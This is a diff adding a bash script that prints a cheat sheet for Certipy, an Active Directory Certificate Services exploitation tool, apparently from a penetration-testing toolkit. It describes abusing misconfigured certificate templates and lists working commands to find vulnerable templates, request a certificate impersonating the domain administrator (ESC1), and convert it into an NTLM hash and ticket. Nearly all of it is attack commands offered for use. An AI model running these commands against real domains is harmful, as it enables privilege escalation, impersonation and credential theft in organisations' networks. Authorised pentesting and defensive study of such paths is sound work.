@@ -1,0 +1,26 @@
+#!/bin/bash
+echo -e "\033[32m╔══════════════════════════════════════╗"
+echo -e "║  📜 Certipy — AD CS Exploitation    ║"
+echo -e "╚══════════════════════════════════════╝\033[0m"
+echo
+echo -e "\033[33mWhy use it:\033[0m Exploit Active Directory Certificate Services"
+echo "  (AD CS) — one of the most overlooked attack surfaces in Windows"
+echo "  domains. Misconfigured certificate templates let you escalate"
+echo "  privileges, impersonate users, or persist as any account. Certipy"
+echo "  finds vulnerable templates, requests certs, and converts them to"
+echo "  usable credentials (NT hash, TGT, PFX). Essential for modern AD"
+echo "  pentesting — ESC1 through ESC15 attack paths."
+echo
+echo -e "\033[33mFind vulnerable certificate templates:\033[0m"
+echo "  certipy find -u user@corp.local -p 'Pass123' -dc-ip 10.0.0.1"
+echo "  certipy find -u user@corp.local -p 'Pass123' -dc-ip 10.0.0.1 -vulnerable"
+echo
+echo -e "\033[33mRequest a cert (ESC1 — escalate to admin):\033[0m"
+echo "  certipy req -u user@corp.local -p 'Pass123' -ca 'CORP-CA' \ "
+echo "    -template VulnTemplate -upn administrator@corp.local -dc-ip 10.0.0.1"
+echo
+echo -e "\033[33mConvert cert to NTLM hash (auth as target):\033[0m"
+echo "  certipy auth -pfx admin.pfx -dc-ip 10.0.0.1"
+echo
+echo -e "\033[33mKey commands:\033[0m  find · req · auth · account · forge · esc4 · shadow"
+echo -e "\033[90m──────────────────────────────────────\033[0m"
